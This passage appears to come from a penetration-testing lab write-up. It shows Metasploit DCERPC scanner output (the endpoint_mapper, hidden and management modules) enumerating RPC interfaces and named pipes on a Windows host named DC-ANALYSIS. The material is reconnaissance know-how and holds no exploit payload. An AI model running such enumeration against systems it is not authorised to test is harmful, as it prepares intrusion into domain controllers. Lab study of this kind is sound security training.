[*] 10.129.36.127:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (OLE8A21A83A972DBB97F99D78259E9C) 
[*] 10.129.36.127:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (LRPC-ebc50ad94f95166dec) 
[*] 10.129.36.127:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (LRPC-5e6fa3398e561150d1) 
[*] 10.129.36.127:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (LRPC-5f83ee691de73bf6dc) 
[*] 10.129.36.127:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (LRPC-a466238297b4103987) 
[*] 10.129.36.127:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (LRPC-6b5a4033655f28c901) 
[*] 10.129.36.127:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (csebpub) 
[*] 10.129.36.127:135      - fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 LRPC (dabrpc) 
[*] 10.129.36.127:135      - 76f226c3-ec14-4325-8a99-6a46348418af v1.0 LRPC (WMsgKRpc0B8F40) 
[*] 10.129.36.127:135      - 76f226c3-ec14-4325-8a99-6a46348418af v1.0 PIPE (\PIPE\InitShutdown) \\DC-ANALYSIS 
[*] 10.129.36.127:135      - 76f226c3-ec14-4325-8a99-6a46348418af v1.0 LRPC (WindowsShutdown) 
[*] 10.129.36.127:135      - d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 LRPC (WMsgKRpc0B8F40) 
[*] 10.129.36.127:135      - d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 PIPE (\PIPE\InitShutdown) \\DC-ANALYSIS 
[*] 10.129.36.127:135      - d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 LRPC (WindowsShutdown) 
[*] 10.129.36.127:135      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```c
msf6 auxiliary(scanner/dcerpc/endpoint_mapper) > use auxiliary/scanner/dcerpc/hidden
<--- SNIP --->
msf6 auxiliary(scanner/dcerpc/hidden) > run

[*] 10.129.36.127:         - Connecting to the endpoint mapper service...
[*] 10.129.36.127:         - Looking for services on 10.129.36.127:49664...
[*] 10.129.36.127:         -     HIDDEN: UUID 76f226c3-ec14-4325-8a99-6a46348418ae v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 894de0c0-0d55-11d3-a322-00c04fa321a1 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 76f226c3-ec14-4325-8a99-6a46348418af v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         - Looking for services on 10.129.36.127:57777...
[*] 10.129.36.127:         -     HIDDEN: UUID 00000134-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 18f70770-8e64-11cf-9af1-0020af6e72f4 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 00000131-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 00000143-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 8326cd1d-cf59-4936-b786-5efc08798e25 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 9556dc99-828c-11cf-a37e-00aa003240c7 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID f50a28cf-5c9c-4f7e-9d80-e25e16e18c59 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 1be41572-91dd-11d1-aeb2-00c04fb68820 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 6919dd07-1637-4611-a8a7-c16fac5b2d53 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID fec1b0ac-5808-4033-a915-c0185934581e v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID e245105b-b06e-11d0-ad61-00c04fd8fdff v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID fd450835-cf1b-4c87-9fd2-5e0d42fde081 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 580acaf8-fa1c-11d0-ad72-00c04fd8fdff v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 8a0dc377-a9d3-41cb-bd69-ae1fdaf2dc68 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 631f7d96-d993-11d2-b339-00105a1f4aaf v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID df2373f5-efb2-475c-ad58-3102d61967d4 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         - Looking for services on 10.129.36.127:49705...
[*] 10.129.36.127:         - Looking for services on 10.129.36.127:49693...
[*] 10.129.36.127:         -     HIDDEN: UUID a2c45f7c-7d32-46ad-96f5-adafb486be74 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 93149ca2-973b-11d1-8c39-00c04fb984f9 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         - Looking for services on 10.129.36.127:49674...
[*] 10.129.36.127:         - Remote Management Interface Error: DCERPC FAULT => nca_unk_if
[*] 10.129.36.127:         - Looking for services on 10.129.36.127:49669...
[*] 10.129.36.127:         -     HIDDEN: UUID 12345678-1234-abcd-ef00-0123456789ab v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         - Looking for services on 10.129.36.127:49667...
[*] 10.129.36.127:         -     HIDDEN: UUID ace1c026-8b3f-4711-8918-f345d17f5bff v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID afc07e2e-311c-4435-808c-c483ffeec7c9 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID d25576e4-00d2-43f7-98f9-b4c0724158f9 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID c681d488-d850-11d0-8c52-00c04fd90f7e v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID fb8a0729-2d04-4658-be93-27b4ad553fac v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 4f32adc8-6052-4a04-8701-293ccf2096f0 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 11220835-5b26-4d94-ae86-c3e475a809de v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 5cbe92cb-f4be-45c9-9fc9-33e73e557b20 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 7f1317a8-4dea-4fa2-a551-df5516ff8879 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 3dde7c30-165d-11d1-ab8f-00805f14db40 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 3919286a-b10c-11d0-9ba8-00c04fd92ef5 v0.0
[*] 10.129.36.127:         -             CONN BIND CALL DATA=0000000057000000 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 00000134-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 18f70770-8e64-11cf-9af1-0020af6e72f4 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 00000131-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 00000143-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         - Looking for services on 10.129.36.127:49671...
[*] 10.129.36.127:         -     HIDDEN: UUID 12345778-1234-abcd-ef00-0123456789ab v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID ace1c026-8b3f-4711-8918-f345d17f5bff v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID afc07e2e-311c-4435-808c-c483ffeec7c9 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID d25576e4-00d2-43f7-98f9-b4c0724158f9 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID c681d488-d850-11d0-8c52-00c04fd90f7e v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID fb8a0729-2d04-4658-be93-27b4ad553fac v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 4f32adc8-6052-4a04-8701-293ccf2096f0 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 11220835-5b26-4d94-ae86-c3e475a809de v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 5cbe92cb-f4be-45c9-9fc9-33e73e557b20 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 7f1317a8-4dea-4fa2-a551-df5516ff8879 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 3dde7c30-165d-11d1-ab8f-00805f14db40 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 3919286a-b10c-11d0-9ba8-00c04fd92ef5 v0.0
[*] 10.129.36.127:         -             CONN BIND CALL DATA=0000000057000000 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 00000134-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 18f70770-8e64-11cf-9af1-0020af6e72f4 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 00000131-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 00000143-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         - Looking for services on 10.129.36.127:49683...
[*] 10.129.36.127:         -     HIDDEN: UUID 12345778-1234-abcd-ef00-0123456789ab v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID ace1c026-8b3f-4711-8918-f345d17f5bff v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID afc07e2e-311c-4435-808c-c483ffeec7c9 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID d25576e4-00d2-43f7-98f9-b4c0724158f9 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID c681d488-d850-11d0-8c52-00c04fd90f7e v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID fb8a0729-2d04-4658-be93-27b4ad553fac v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 4f32adc8-6052-4a04-8701-293ccf2096f0 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 11220835-5b26-4d94-ae86-c3e475a809de v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 5cbe92cb-f4be-45c9-9fc9-33e73e557b20 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 7f1317a8-4dea-4fa2-a551-df5516ff8879 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 3dde7c30-165d-11d1-ab8f-00805f14db40 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 3919286a-b10c-11d0-9ba8-00c04fd92ef5 v0.0
[*] 10.129.36.127:         -             CONN BIND CALL DATA=0000000057000000 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 12345778-1234-abcd-ef00-0123456789ac v1.0
[*] 10.129.36.127:         -             CONN BIND CALL DATA=0000000000000000000000000000000000000000220000c0 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 00000134-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 18f70770-8e64-11cf-9af1-0020af6e72f4 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 00000131-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 00000143-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         - Looking for services on 10.129.36.127:49666...
[*] 10.129.36.127:         -     HIDDEN: UUID 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 1ff70682-0a51-30e8-076d-740be8cee98b v1.0
[*] 10.129.36.127:         -             CONN BIND CALL DATA=0000000032000000 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 378e52b0-c0a9-11cf-822d-00aa0051e40f v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 2a82bb21-e44f-4791-9aa1-dfae788e2f43 v1.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 00000134-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 18f70770-8e64-11cf-9af1-0020af6e72f4 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 00000131-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         -     HIDDEN: UUID 00000143-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         - Looking for services on 10.129.36.127:49665...
[*] 10.129.36.127:         -     HIDDEN: UUID 82273fdc-e32a-18c3-3f78-827929dc23ea v0.0
[*] 10.129.36.127:         -             CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied 
[*] 10.129.36.127:         - 
[*] 10.129.36.127:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```c
msf6 auxiliary(scanner/dcerpc/hidden) > use auxiliary/scanner/dcerpc/management
<--- SNIP --->
msf6 auxiliary(scanner/dcerpc/management) > run

[*] 10.129.36.127:135      - UUID e1af8308-5d1f-11c9-91a4-08002b14a0fa v3.0
[*] 10.129.36.127:135      - Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
[*] 10.129.36.127:135      -      listening: 00000000
[*] 10.129.36.127:135      -      killed: 00000005
[*] 10.129.36.127:135      -      name: 00010000000000000100000000000000d3060000
[*] 10.129.36.127:135      - UUID 0b0a6584-9e0f-11cf-a3cf-00805f68cb1b v1.1
[*] 10.129.36.127:135      - Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
[*] 10.129.36.127:135      -      listening: 00000000
[*] 10.129.36.127:135      -      killed: 00000005
[*] 10.129.36.127:135      -      name: 00010000000000000100000000000000d3060000
[*] 10.129.36.127:135      - UUID 1d55b526-c137-46c5-ab79-638f2a68e869 v1.0
[*] 10.129.36.127:135      - Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
[*] 10.129.36.127:135      -      listening: 00000000
[*] 10.129.36.127:135      -      killed: 00000005
[*] 10.129.36.127:135      -      name: 00010000000000000100000000000000d3060000
[*] 10.129.36.127:135      - UUID 64fe0b7f-9ef5-4553-a7db-9a1975777554 v1.0
[*] 10.129.36.127:135      - Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
[*] 10.129.36.127:135      -      listening: 00000000
[*] 10.129.36.127:135      -      killed: 00000005
[*] 10.129.36.127:135      -      name: 00010000000000000100000000000000d3060000
[*] 10.129.36.127:135      - UUID e60c73e6-88f9-11cf-9af1-0020af6e72f4 v2.0
[*] 10.129.36.127:135      - Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
[*] 10.129.36.127:135      -      listening: 00000000
[*] 10.129.36.127:135      -      killed: 00000005
[*] 10.129.36.127:135      -      name: 00010000000000000100000000000000d3060000
[*] 10.129.36.127:135      - UUID 99fcfec4-5260-101b-bbcb-00aa0021347a v0.0
[*] 10.129.36.127:135      - Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
[*] 10.129.36.127:135      -      listening: 00000000
[*] 10.129.36.127:135      -      killed: 00000005
[*] 10.129.36.127:135      -      name: 00010000000000000100000000000000d3060000
[*] 10.129.36.127:135      - UUID b9e79e60-3d52-11ce-aaa1-00006901293f v0.2
[*] 10.129.36.127:135      - Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
[*] 10.129.36.127:135      -      listening: 00000000
[*] 10.129.36.127:135      -      killed: 00000005
[*] 10.129.36.127:135      -      name: 00010000000000000100000000000000d3060000
[*] 10.129.36.127:135      - UUID 412f241e-c12a-11ce-abff-0020af6e7a17 v0.2
[*] 10.129.36.127:135      - Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
[*] 10.129.36.127:135      -      listening: 00000000
[*] 10.129.36.127:135      -      killed: 00000005
[*] 10.129.36.127:135      -      name: 00010000000000000100000000000000d3060000
[*] 10.129.36.127:135      - UUID 00000136-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:135      - Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
[*] 10.129.36.127:135      -      listening: 00000000
[*] 10.129.36.127:135      -      killed: 00000005
[*] 10.129.36.127:135      -      name: 00010000000000000100000000000000d3060000
[*] 10.129.36.127:135      - UUID c6f3ee72-ce7e-11d1-b71e-00c04fc3111a v1.0
[*] 10.129.36.127:135      - Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
[*] 10.129.36.127:135      -      listening: 00000000
[*] 10.129.36.127:135      -      killed: 00000005
[*] 10.129.36.127:135      -      name: 00010000000000000100000000000000d3060000
[*] 10.129.36.127:135      - UUID 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57 v0.0
[*] 10.129.36.127:135      - Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
[*] 10.129.36.127:135      -      listening: 00000000
